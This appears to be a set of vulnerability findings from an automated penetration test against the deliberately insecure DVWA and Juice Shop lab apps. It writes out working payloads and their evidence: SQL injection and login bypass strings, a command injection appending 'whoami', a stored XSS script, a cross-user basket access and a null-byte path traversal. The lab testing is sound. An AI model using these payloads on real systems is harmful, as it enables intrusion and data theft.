findings.title: SQL Injection (boolean) in DVWA sqli id parameter [security=low]
request_sequence: POST /security.php (security=low, seclev_submit=Submit, user_token=[REDACTED] to confirm low level
findings.response_evidence: [security=low] TRUE payload `1' OR '1'='1` returned 5 records via <pre> blocks leaking multiple seeded user surnames verbatim: Surname: admin, Surname: Brown, Surname: Me, Surname: Picasso, Surname: Smith (first names admin, Gordon, Hack, Pablo, Bob). FALSE payload `1' AND '1'='2` returned zero records ("User ID:" with no pre blocks / no name output). Boolean-based differential confirms SQL injection.

findings.title: OS Command Injection in DVWA exec ip parameter [security=low]
findings.response_evidence: [security=low] Payload `127.0.0.1; whoami` returned the ping output followed by injected command output in the <pre> block ending with the web-process identity: `www-data`. This proves arbitrary OS command execution via the ; separator.

findings.title: Stored Cross-Site Scripting in DVWA guestbook mtxMessage [security=low]
request_sequence: POST /vulnerabilities/xss_s/ with txtName=canary&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook (security=low, submitted via http_request to bypass client-side maxlength)
browser_navigate (dvwa_admin) to http://dvwa/vulnerabilities/xss_s/ to render stored guestbook
findings.response_evidence: [security=low] The canary <script id="test_token">window.xss_flag=1</script> was persisted in the guestbook (entry Name: canary). On rendering the page in the authenticated dvwa_admin browser session, the injected script executed.
findings.browser_js_evidence: browser_eval_js("window.xss_flag") returned 1 (integer). browser_read_dom("#test_token") confirmed the injected script element is present in the DOM with inner_text "window.xss_flag=1". Proves stored script execution in victim browser context.

findings.title: Product-Search SQL Injection (UNION-based) on /rest/products/search
findings.response_evidence: Single-quote probe q=qwert' returned HTTP 500 with body: "Error: SQLITE_ERROR: near \"'%'\": syntax error" — proves the q parameter is concatenated into a SQL LIKE clause unsanitized. The 9-column UNION probe returned HTTP 200 with no SQL error and the injected constants mapped directly into result columns: {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}. Column-count/type alignment success confirms exploitable UNION-based SQLi.

findings.title: Login Authentication-Bypass SQL Injection on /rest/user/login
findings.response_evidence: Unauthenticated POST with email=' OR 1=1-- and arbitrary password returned HTTP 200 JSON: {"authentication":{"token":"[JWT present/REDACTED]","bid":1,"umail":"admin@juice-sh.op"}}. A valid authentication JWT was issued and the resolved identity is the first seeded user admin@juice-sh.op — the injected OR 1=1 bypasses credential validation and logs in as the first row. Confirmed auth bypass.

findings.title: Unauthenticated User-Feedback PII Exposure on /api/Feedbacks
findings.response_evidence: Unauthenticated GET returned HTTP 200 with a full data array of feedback records exposing author PII and UserId linkage without any authentication. Each comment appends the author email (masked by app but disclosing domain + partial local-part), e.g. UserId:1 -> "...(***in@juice-sh.op)", UserId:2 -> "...(***@juice-sh.op)", UserId:3 -> "...(***der@juice-sh.op)", UserId:21 -> "...(***ereum@juice-sh.op)". Record id=4 additionally leaks a sensitive 12-word crypto wallet seed mnemonic in cleartext. UserId values (1,2,3,21) are directly exposed and correlate authors to feedback. Author email addresses + UserIds are disclosed without authentication, confirming PII exposure.

findings.title: Cross-User Basket Access / BOLA on /rest/basket/{id}
request_sequence: GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct1) -> own_basket_id=6, UserId=22, contains Apple Juice (1000ml) qty 3
GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct2) -> own_basket_id=7, but retrieves basket 6 belonging to UserId 22
findings.response_evidence: Account 2 (acct2_bench@juiceshop.local, own_basket_id=7) successfully retrieved Account 1's basket #6 (UserId 22) with HTTP 200. The response disclosed Account 1's distinct seeded item: {"name":"Apple Juice (1000ml)", "BasketItem":{"BasketId":6,"quantity":3}}. There is no authorization check binding the basket ID to the requesting user, confirming BOLA / IDOR cross-user basket access.

findings.title: Confidential Document (acquisitions.md) via Open Directory Listing on /ftp/
request_sequence: GET http://juiceshop:3000/ftp/ (session=unauth, Accept: text/html,application/json) -> HTTP 200 directory listing
findings.response_evidence:
Unauthenticated GET /ftp/ returned HTTP 200 with a browsable directory listing enumerating files including "acquisitions.md 909 12/19/2023" (plus announcement_encrypted.md, coupons_2013.md.bak, package.json.bak, incident-support.kdbx, etc.). Direct unauthenticated GET /ftp/acquisitions.md returned HTTP 200 (text/markdown) disclosing the confidential memo. Excerpt: "# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact... Our shareholders will be excited. It's true. No fake news."

findings.title: Exposed Encryption-Keys Directory Listing on /encryptionkeys/
request_sequence: GET http://juiceshop:3000/encryptionkeys/ (session=unauth) -> HTTP 200 browsable directory listing
findings.response_evidence: Unauthenticated GET /encryptionkeys/ returned HTTP 200 with a browsable directory listing (visible text: "listing directory /encryptionkeys/") exposing sensitive key files: "jwt.pub 248 12/19/2023" and "premium.key 50 12/19/2023". Both files are directly linked (/encryptionkeys/jwt.pub, /encryptionkeys/premium.key), confirming exposure of the server's public JWT signing key and premium feature key via information exposure through directory listing.

findings.title: Poison Null-Byte Path Traversal bypasses extension filter to retrieve restricted package.json.bak
findings.response_evidence: Raw path GET /ftp/package.json.bak returned HTTP 403 blocked by extension filter: "Error: Only .md and .pdf files are allowed! ... at verify (/juice-shop/build/routes/fileServer.js:55:18)". Null-byte bypass GET /ftp/package.json.bak%2500.md returned HTTP 200 (content-type application/octet-stream) disclosing the restricted backup file contents: {"name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", "author": "Björn Kimminich ..."} including full dependency/devDependency lists. The %2500 (URL-encoded null byte) + allowed .md extension defeated the server-side filter, proving CWE-22 path/extension-filter traversal.

findings.title: Direct retrieval of acquisitions.md — duplicate of existing /ftp/ open-directory-listing finding
findings.response_evidence:
GET /ftp/acquisitions.md returns HTTP 200 with the confidential memo: "# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year...". However this is the SAME confidential document already captured and reported by the existing /ftp/ open-directory-listing (CWE-200) finding — materially identical content (same memo text, 909 bytes). Rejected as a duplicate instance to avoid double-reporting the same confidential-document exposure.
